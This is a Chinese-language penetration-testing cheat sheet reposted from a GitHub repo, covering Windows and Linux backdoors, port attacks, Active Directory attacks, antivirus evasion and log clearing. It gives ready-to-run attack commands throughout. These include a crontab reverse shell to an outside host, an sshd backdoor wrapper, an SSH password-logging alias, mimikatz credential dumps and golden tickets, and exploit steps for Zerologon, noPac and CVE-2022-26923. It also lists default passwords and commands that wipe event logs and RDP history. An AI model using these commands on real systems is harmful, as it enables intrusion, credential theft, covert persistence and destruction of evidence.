编写自定义 Verifier provider DLL 通过 Application Verifier 进行安装 注入到目标进程执行 payload 每当目标进程启动，均会执行 payload，相当于一个自启动的方式 POC : https://github.com/Cybellum/DoubleAgent

##### 19、waitfor.exe

不支持自启动，但可远程主动激活，后台进程显示为 waitfor.exe POC : https://github.com/3gstudent/Waitfor-Persistence

##### 20、AppDomainManager

针对. Net 程序，通过修改 AppDomainManager 能够劫持. Net 程序的启动过程。如果劫持了系统常见. Net 程序如 powershell.exe 的启动过程，向其添加 payload，就能实现一种被动的后门触发机制

##### 21、Office

劫持 Office 软件的特定功能: 通过 dll 劫持, 在 Office 软件执行特定功能时触发后门 利用 VSTO 实现的 office 后门 Office 加载项

*   Word WLL
    
*   Excel XLL
    
*   Excel VBA add-ins
    
*   PowerPoint VBA add-ins
    

> 参考 1 ：https://3gstudent.github.io/Use-Office-to-maintain-persistence

> 参考 2 ：https://3gstudent.github.io/Office-Persistence-on-x64-operating-system

##### 22、CLR

无需管理员权限的后门，并能够劫持所有. Net 程序 POC:https://github.com/3gstudent/CLR-Injection

##### 23、msdtc

利用 MSDTC 服务加载 dll，实现自启动，并绕过 Autoruns 对启动项的检测 利用：向 %windir%\system32 \ 目录添加 dll 并重命名为 oci.dll

##### 24、Hijack CAccPropServicesClass and MMDeviceEnumerato

利用 COM 组件，不需要重启系统，不需要管理员权限 通过修改注册表实现 POC：https://github.com/3gstudent/COM-Object-hijacking

##### 25、Hijack explorer.exe

COM 组件劫持，不需要重启系统，不需要管理员权限 通过修改注册表实现

```
HKCU\Software\Classes\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}
HKCU\Software\Classes\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9}
HKCU\Software\Classes\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}
HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}
```

##### 26、Windows FAX DLL Injection

通过 DLL 劫持，劫持 Explorer.exe 对 fxsst.dll 的加载 Explorer.exe 在启动时会加载 c:\Windows\System32\fxsst.dll(服务默认开启，用于传真服务) 将 payload.dll 保存在 c:\Windows\fxsst.dll，能够实现 dll 劫持，劫持 Explorer.exe 对 fxsst.dll 的加载

##### 27、特殊注册表键值

在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取 (使用 Win32 API)，但系统能够执行 (使用 Native API)。

《渗透技巧——"隐藏" 注册表的创建》

《渗透技巧——"隐藏" 注册表的更多测试》

##### 28、快捷方式后门

替换我的电脑快捷方式启动参数 POC : https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1

##### 29、Logon Scripts

```
New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "c:\test\11.bat" -propertyType string | Out-Null
```

##### 30、Password Filter DLL

##### 31、利用 BHO 实现 IE 浏览器劫持

#### Linux

##### crontab

每 60 分钟反弹一次 shell 给 dns.wuyun.org 的 53 端口

```
#!bash(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/dns.wuyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
```

##### 硬链接 sshd

```
#!bashln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;
```

链接：ssh root@192.168.206.142 -p 2333

##### SSH Server wrapper

```
#!bashcd /usr/sbinmv sshd ../binecho '#!/usr/bin/perl' >sshdecho 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshdecho 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshdchmod u+x sshd//不用重启也行/etc/init.d/sshd restart
```

```
socat STDIO TCP4:192.168.206.142:22,sourceport=13377
```

##### SSH keylogger

vim 当前用户下的. bashrc 文件, 末尾添加

```
#!bashalias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'
```

source .bashrc

##### Cymothoa_进程注入 backdoor

```
./cymothoa -p 2270 -s 1 -y 7777
```

```
nc -vv ip 7777
```

##### rootkit

*   openssh_rootkit
    
*   Kbeast_rootkit
    
*   Mafix + Suterusu rootkit
    

##### Tools

*   Vegile
    
*   backdoor
    

### WEB 后门

PHP Meterpreter 后门 Aspx Meterpreter 后门 weevely webacoo  
....

横向渗透
----

### 端口渗透

#### 端口扫描

*   1. 端口的指纹信息（版本信息）
    
*   2. 端口所对应运行的服务
    
*   3. 常见的默认端口号
    
*   4. 尝试弱口令
    

#### 端口爆破

hydra

#### 端口弱口令

*   NTScan
    
*   Hscan
    
*   自写脚本
    

#### 端口溢出

smb

*   ms08067
    
*   ms17010
    
*   ms11058
    
*   ...
    

apache ftp ...

#### 常见的默认端口

##### 1、web 类 (web 漏洞 / 敏感目录)

第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix ...

```
80 web 
80-89 web 
8000-9090 web 
```

##### 2、数据库类 (扫描弱口令)

```
1433 MSSQL 
1521 Oracle 
3306 MySQL 
5432 PostgreSQL 
50000 DB2
```

##### 3、特殊服务类 (未授权 / 命令执行类 / 漏洞)

```
443 SSL心脏滴血 
445 ms08067/ms11058/ms17010等 
873 Rsync未授权 
5984 CouchDB http://xxx:5984/_utils/ 
6379 redis未授权 
7001,7002 WebLogic默认弱口令，反序列 
9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 
11211 memcache未授权访问 
27017,27018 Mongodb未授权访问 
50000 SAP命令执行 
50070,50030 hadoop默认端口未授权访问 
```

##### 4、常用端口类 (扫描弱口令 / 端口爆破)

```
21 ftp 
22 SSH 
23 Telnet 
445 SMB弱口令扫描 
2601,2604 zebra路由，默认密码zebra 
3389 远程桌面 
```

##### 5、端口合计所对应的服务

```
21 ftp 22 SSH 23 Telnet 25 SMTP 53 DNS 69 TFTP 80 web 80-89 web 110 POP3 135 RPC 139 NETBIOS 143 IMAP 161 SNMP 389 LDAP 443 SSL心脏滴血以及一些web漏洞测试 445 SMB 512,513,514 Rexec 873 Rsync未授权 1025,111 NFS 1080 socks 1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 1433 MSSQL (暴力破解) 1521 Oracle:(iSqlPlus Port:5560,7778) 2082/2083 cpanel主机管理系统登陆 （国外用较多） 2222 DA虚拟主机管理系统登陆 （国外用较多） 2601,2604 zebra路由，默认密码zebra 3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 3306 MySQL （暴力破解） 3312/3311 kangle主机管理系统登陆 3389 远程桌面 3690 svn 4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 4848 GlassFish web中间件 弱口令:admin/adminadmin 5432 PostgreSQL 5900 vnc 5984 CouchDB http://xxx:5984/_utils/ 6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 6379 redis未授权 7001,7002 WebLogic默认弱口令，反序列 7778 Kloxo主机控制面板登录 8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 8080 tomcat/WDCd/ 主机管理系统，默认弱口令 8080,8089,9090 JBOSS 8081 Symantec AV/Filter for MSE 8083 Vestacp主机管理系统 （国外用较多） 8649 ganglia 8888 amh/LuManager 主机管理系统默认端口 9000 fcgi fcig php执行 9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 28017 mongodb统计页面 50000 SAP命令执行 50060 hadoop 50070,50030 hadoop默认端口未授权访问
```

### 域渗透

#### 信息搜集

##### powerview.ps1

```
Get-NetDomain - gets the name of the current user's domainGet-NetForest - gets the forest associated with the current user's domainGet-NetForestDomains - gets all domains for the current forestGet-NetDomainControllers - gets the domain controllers for the current computer's domainGet-NetCurrentUser - gets the current [domain\]usernameGet-NetUser - returns all user objects, or the user specified (wildcard specifiable)Get-NetUserSPNs - gets all user ServicePrincipalNamesGet-NetOUs - gets data for domain organization unitsGet-NetGUIDOUs - finds domain OUs linked to a specific GUIDInvoke-NetUserAdd - adds a local or domain userGet-NetGroups - gets a list of all current groups in the domainGet-NetGroup - gets data for each user in a specified domain groupGet-NetLocalGroups - gets a list of localgroups on a remote host or hostsGet-NetLocalGroup - gets the members of a localgroup on a remote host or hostsGet-NetLocalServices - gets a list of running services/paths on a remote host or hostsInvoke-NetGroupUserAdd - adds a user to a specified local or domain groupGet-NetComputers - gets a list of all current servers in the domainGet-NetFileServers - get a list of file servers used by current domain usersGet-NetShare - gets share information for a specified serverGet-NetLoggedon - gets users actively logged onto a specified serverGet-NetSessions - gets active sessions on a specified serverGet-NetFileSessions - returned combined Get-NetSessions and Get-NetFilesGet-NetConnections - gets active connections to a specific server resource (share)Get-NetFiles - gets open files on a serverGet-NetProcesses - gets the remote processes and owners on a remote server
```

PowerView-2.0-tricks:

```
https://gist.github.com/HarmJ0y/3328d954607d71362e3c
```

PowerView-3.0-tricks

```
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
```

##### BloodHound

获取某 OU 下所有机器信息

```
{            "name": "Find the specificed OU computers",            "queryList": [                {                    "final": false,                    "title": "Select a OU...",                    "query": "MATCH (n:OU) RETURN distinct n.name ORDER BY n.name DESC"                },                {                    "final": true,                    "query": "MATCH (m:OU  {name: $result}) with m MATCH p=(o:OU {objectid: m.objectid})-[r:Contains*1..]->(n:Computer) RETURN p",                    "allowCollapse": true,                    "endNode": "{}"                }            ]        }
```

自动标记 owned 用户及机器

SyncDog

##### 获取域内 DNS 信息

*   adidnsdump
    
*   域渗透——DNS 记录的获取
    

#### 获取域控的方法

##### SYSVOL

SYSVOL 是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。Sysvol 文件夹是安装 AD 时创建的，它用来存放 GPO、Script 等信息。同时，存放在 Sysvol 文件夹中的信息，会复制到域中所有 DC 上。相关阅读:

*   寻找 SYSVOL 里的密码和攻击 GPP（组策略偏好）
    
*   Windows Server 2008 R2 之四管理 Sysvol 文件夹
    
*   SYSVOL 中查找密码并利用组策略首选项
    
*   利用 SYSVOL 还原组策略中保存的密码
    

##### MS14-068 Kerberos

```
python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机
```

利用 mimikatz 将工具得到的 TGT_domainuser@SERVER.COM.ccache 写入内存，创建缓存证书：

```
mimikatz.exe "kerberos::ptc c:TGT_darthsidious@pentest.com.ccache" exitnet use k: \pentest.comc$
```

相关阅读 :

*   Kerberos 的工具包 PyKEK
    
*   深入解读 MS14-068 漏洞
    
*   Kerberos 的安全漏洞
    

##### SPN 扫描

Kerberoast 可以作为一个有效的方法从 Active Directory 中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。SPN 是服务在使用 Kerberos 身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户（如 NetworkService 或 LocalSystem）或用户帐户下为服务器注册 SPN。对于内部帐户，SPN 将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册 SPN。SPN 扫描的主要好处是，SPN 扫描不需要连接到网络上的每个 IP 来检查服务端口，SPN 通过 LDAP 查询向域控执行服务发现，SPN 查询是 Kerberos 的票据行为一部分，因此比较难检测 SPN 扫描。相关阅读 :

*   非扫描式的 SQL Server 发现
    
*   SPN 扫描
    
*   扫描 SQLServer 的脚本
    

##### Kerberos 的黄金门票

在域上抓取的哈希

```
lsadump::dcsync /domain:pentest.com /user:krbtgt
```

```
kerberos::purgekerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribikerberos::ptt administrator.kiribikerberos::tgtnet use k: \pnet use k: \pentest.comc$
```

相关阅读 :

*   https://adsecurity.org/?p=1640
    
*   域服务账号破解实践
    
*   Kerberos 的认证原理
    
*   深刻理解 windows 安全认证机制 ntlm＆Kerberos
    

##### Kerberos 的银票务

黄金票据和白银票据的一些区别：Golden Ticket：伪造 TGT，可以获取任何 Kerberos 服务权限 银票：伪造 TGS，只能访问指定的服务 加密方式不同：Golden Ticket 由 krbtgt 的 hash 加密 Silver Ticket 由服务账号（通常为计算机账户）Hash 加密 认证流程不同：金票在使用的过程需要同域控通信 银票在使用的过程不需要同域控通信 相关阅读 :

*   攻击者如何使用 Kerberos 的银票来利用系统
    
*   域渗透——Pass The Ticket
    

##### 域服务账号破解

与上面 SPN 扫描类似的原理 https://github.com/nidem/kerberoast 获取所有用作 SPN 的帐户

```
setspn -T PENTEST.com -Q */*
```

从 Mimikatz 的 RAM 中提取获得的门票

```
kerberos::list /export
```

用 rgsrepcrack 破解

```
tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

##### 凭证盗窃

从搜集的密码里面找管理员的密码

##### NTLM relay

*   One API call away from Domain Admin
    
*   privexchange
    
*   Exchange2domain
    

用于主动让目标机器发起 NTLM 请求的方法：

*   printerbug
    
*   PetitPotam
    

Relay LDAP:

*   CVE-2019-1040-dcpwn
    

Relay AD CS/PKI:

*   AD CS/PKI template exploit
    

集成几个利用的工具：

*   Relayx
    

内网 445 端口转发：

*   PortBender
    

##### Kerberos 委派

*   Wagging-the-Dog.html
    
*   s4u2pwnage
    
*   Attacking Kerberos Delegation
    
*   用打印服务获取域控
    
*   Computer Takeover
    
*   Combining NTLM Relaying and Kerberos delegation
    
*   CVE-2019-1040
    

##### 地址解析协议

实在搞不定再搞 ARP

##### Zerologon

1、利用 Mimikatz check

```
lsadump::zerologon /target:dc1.exploit.local /account:dc1$
```

exploit

```
lsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploit
```

dcsync

```
lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local /authpassword:"" /domain:exploit.local /authntlm /user:krbtgt
```

restore

```
lsadump::postzerologon /target:conttosson.locl /account:dc$ 
```

2、利用 impacket：

*   取目标主机名 + IP
    
*   install 修改版本的 impacket
    
*   Exp
    

```
python cve-2020-1472-exploit.py DC2008 10.211.55.200
```

```
secretsdump.py -no-pass cgdomain.com/'DC2008$'@10.211.55.200 -history -just-dc-user administrator
```

```
secretsdump.py -no-pass cgdomain.com/administrator@10.211.55.200 -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae
```

获取到旧的密码明文 hex，还原

```
python restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b
```

恢复方法 2 通过 wmic, pass the hash 拿到域控制器中的本地管理员权限 (域管)

```
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38
```

然后分别执行, 拷贝本机中 SAM 数据库到本地

```
- reg save HKLM\SYSTEM system.save
- reg save HKLM\SAM sam.save
- reg save HKLM\SECURITY security.save
- get system.save
- get sam.save
- get security.save
- del /f system.save
- del /f sam.save
- del /f security.save
```

提取明文 hash

```
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

然后恢复。

##### noPac

漏洞分析：CVE-2021-42287/CVE-2021-42278 Weaponisation

Exploit：

```
# Create Machine AccountNew-MachineAccount -MachineAccount TestSPN -Domain internal.zeroday.lab -DomainController idc1.internal.zeroday.lab -Verbose# Clear SPNsSet-DomainObject "CN=TestSPN,CN=Computers,DC=internal,DC=zeroday,DC=lab" -Clear 'serviceprincipalname' -Verbose# Change Machine Account samaccountnameSet-MachineAccountAttribute -MachineAccount TestSPN -Value "IDC1" -Attribute samaccountname -Verbose# Request TGT.\Rubeus.exe asktgt /user:IDC1 /password:Password1 /domain:internal.zeroday.lab /dc:idc1.internal.zeroday.lab /nowrap# Change Machine Account samaccountnameSet-MachineAccountAttribute -MachineAccount TestSPN -Value "TestSPN" -Attribute samaccountname -Verbose# Request S4U2self.\Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:idc1.internal.zeroday.lab /self /altservice:LDAP/IDC1.internal.zeroday.lab /ptt /ticket:[TGT]
```

一键利用：noPac

##### ADCS

利用 ADCS 中错误配置的模板进行域提权，详细可参考：Certified_Pre-Owned

可利用工具：

*   Certify
    
*   Certipy
    
*   PKINITtools
    
*   certi
    

##### CVE-2022-26923

前提：域内有 ADCS Exploit:

```
# 修改可控机器DNSpython certi.py account create cgdomain.com/sanfeng:'1qazXSW@'@10.211.55.200 -dc-ip 10.211.55.200 -user testvul -dns dc2008.cgdomain.com# 请求证书python certi.py req 'cgdomain.com/testvul$:NUxhMemzaP4rsPnu'@10.211.55.200 -dc-ip 10.211.55.200 -ca cgdomain-DC2008-CA -template 'Machine'# 获取DC hashpython certi.py auth -dc-ip 10.211.55.200 -pfx dc2008.pfx -username dc2008$# 还原机器DNSpython certi.py account update cgdomain.com/sanfeng:'1qazXSW@'@10.211.55.200 -dc-ip 10.211.55.200 -user testvul -dns testvul.hqcec.com
```

> 注：此环境的 ADCS 与 DC 为同一台机器。真实环境需要根据实际情况进行参数调整。

#### 获取 AD 哈希

*   使用 VSS 卷影副本
    
*   Ntdsutil 中获取 NTDS.DIT 文件
    
*   PowerShell 中提取 NTDS.DIT -->Invoke-NinaCopy
    
*   使用 Mimikatz 提取
    

```
mimikatz lsadump::lsa /inject exit
```

*   使用 PowerShell Mimikatz
    
*   使用 Mimikatz 的 DCSync 远程转储 Active Directory 凭证 提取 KRBTGT 用户帐户的密码数据：
    

```
Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt"exit
```

管理员用户帐户提取密码数据：

```
Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator" exit
```

*   NTDS.dit 中提取哈希 使用 esedbexport 恢复以后使用 ntdsxtract 提取
    

#### AD 持久化

##### 活动目录持久性技巧

https://adsecurity.org/?p=1929 DS 恢复模式密码维护 DSRM 密码同步

> Windows Server 2008 需要安装 KB961320 补丁才支持 DSRM 密码同步，Windows Server 2003 不支持 DSRM 密码同步。KB961320:https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni, 可参考：巧用 DSRM 密码同步将域控权限持久化

DCshadow

##### Security Support Provider

简单的理解为 SSP 就是一个 DLL，用来实现身份认证

```
privilege::debug
misc::memssp
```

这样就不需要重启 c:/windows/system32 可看到新生成的文件 kiwissp.log

##### SID History

SID 历史记录允许另一个帐户的访问被有效地克隆到另一个帐户

```
mimikatz "privilege::debug" "misc::addsid bobafett ADSAdministrator"
```

##### AdminSDHolder＆SDProp

利用 AdminSDHolder＆SDProp（重新）获取域管理权限

##### 组策略

https://adsecurity.org/?p=2716 策略对象在持久化及横向渗透中的应用

##### Hook PasswordChangeNotify

http://www.vuln.cn/6812

##### Kerberoasting 后门

域渗透 - Kerberoasting

##### AdminSDHolder

Backdooring AdminSDHolder for Persistence

##### Delegation

Unconstrained Domain Persistence

##### 黄金证书

certified-pre-owned

证书伪造：pyForgeCert

#### 其他

##### 域内主机提权

SharpAddDomainMachine

##### Exchange 的利用

*   owa_info
    
*   Exchange2domain
    
*   CVE-2018-8581
    
*   CVE-2019-1040
    
*   CVE-2020-0688
    
*   NtlmRelayToEWS
    
*   ewsManage
    
*   CVE-2021-26855
    
*   CVE-2021-28482
    

#### TIPS

《域渗透——Dump Clear-Text Password after KB2871997 installed》

《域渗透——Hook PasswordChangeNotify》

> 可通过 Hook PasswordChangeNotify 实时记录域控管理员的新密码

《域渗透——Local Administrator Password Solution》

> 域渗透时要记得留意域内主机的本地管理员账号

《域渗透——利用 SYSVOL 还原组策略中保存的密码》

#### 相关工具

*   BloodHound
    
*   CrackMapExec
    
*   DeathStar
    
    > 利用过程：http://www.freebuf.com/sectool/160884.html
    

### 在远程系统上执行程序

*   At
    
*   Psexec
    
*   WMIC
    
*   Wmiexec
    
*   Smbexec
    
*   Powershell remoting
    
*   DCOM
    
*   Winrm (https://github.com/Hackplayers/evil-winrm)
    

### IOT 相关

*   1、路由器 routersploit
    
*   2、打印机 PRET
    
*   3、IOT exp https://www.exploitee.rs/
    
*   4、相关 OWASP-Nettacker isf icsmaster
    

### 中间人

*   Cain
    
*   Ettercap
    
*   Responder
    
*   MITMf
    
*   3r/MITMf)
    

### 规避杀软及检测

#### Bypass Applocker

UltimateAppLockerByPassList https://lolbas-project.github.io/

#### BypassAV

*   Empire
    
*   PEspin
    
*   Shellter
    
*   Ebowla
    
*   Veil
    
*   PowerShell
    
*   Python
    
*   代码注入技术 Process Doppelgänging
    
*   ...
    

痕迹清理
----

### Windows 日志清除

获取日志分类列表：

```
wevtutil el >1.txt
```

获取单个日志类别的统计信息：eg.

```
wevtutil gli "windows powershell"
```

回显：

```
creationTime: 2016-11-28T06:01:37.986Z
lastAccessTime: 2016-11-28T06:01:37.986Z
lastWriteTime: 2017-08-08T08:01:20.979Z
fileSize: 1118208
attributes: 32
numberOfLogRecords: 1228
oldestRecordNumber: 1
```

查看指定日志的具体内容：

```
wevtutil qe /f:text "windows powershell"
```

删除单个日志类别的所有信息：

```
wevtutil cl "windows powershell"
```

### 破坏 Windows 日志记录功能

利用工具

*   Invoke-Phant0m
    
*   Windwos-EventLog-Bypass
    

### Metasploit

```
run clearlogs 
```

```
clearev 
```

### 3389 登陆记录清除

```
@echo off@reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f@del "%USERPROFILE%\My Documents\Default.rdp" /a@exit
```

**本文转载自网络**

**作者：Evi1cg**

**原文链接：****https://github.com/Ridter/Intranet_Penetration_Tips**

**—  实验室旗下直播培训课程  —**

[![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicA9KFkLGt8mzvD4D5pQrskyFeX9AWKddh4nrvm9999WoQgr5bmsXx2V0phVj0BLqicpJRBWLTa0Nw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247499288&idx=1&sn=dd806e35641cdc1061c7449378a385d9&chksm=fc3c4719cb4bce0f62d4629d6629bb8c7f61aeddb4f167be9f54f42738c165e59199a610087c&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicA9KFkLGt8mzvD4D5pQrsk3SZsMB7yj3zk62DmRzsntvMnAPIg7ye13581fwbrLvOXhZYJQYKn8w/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247499791&idx=1&sn=64535b3e9fbe588928500eb1bd811618&chksm=fc3c790ecb4bf0185e20ab3046fbbc84dbfc3d44d4a03766f4c88ba1a87ca392a00b82dafa60&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicA9KFkLGt8mzvD4D5pQrskBWmo8lxWicgicM20jfNasia1TSP6Lo8sWVvk4GwPsliaxcqTN0XnsQAxtQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247499127&idx=1&sn=b70c7227766fe84144465afec57874c9&chksm=fc3c4476cb4bcd60f4498a9f02c948d861e502f837225d90a9f719ebfc6e599f1ef06a33ea40&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicA9KFkLGt8mzvD4D5pQrskeURCFJ8ibibn0dialmapha82dQ9JvOYWnIteg8w5I0zuZSYf2V8chyemg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247497148&idx=1&sn=b608996d550a64228eb17f4a678c659c&chksm=fc3c4cbdcb4bc5ab531b3719c9ee7206668752c6075a47ee736b6e720d792fbabcea96a74c18&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicA9KFkLGt8mzvD4D5pQrskuhNJ7m6CIAYmAKqQbx2Hc4QWJRoTHDDYuxvqXR3aC7GbuXeAjVrkuQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247498871&idx=1&sn=796142e7b5ccb3c209a66bed73a7a4b5&chksm=fc3c4576cb4bcc605e27dc2a438a2a38f1a2f4c02cec81d894b36a36a5ae5a6007388e44ec95&scene=21#wechat_redirect)

**  
来和 10000 + 位同学加入 MS08067 **一起**学习吧！**  

![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)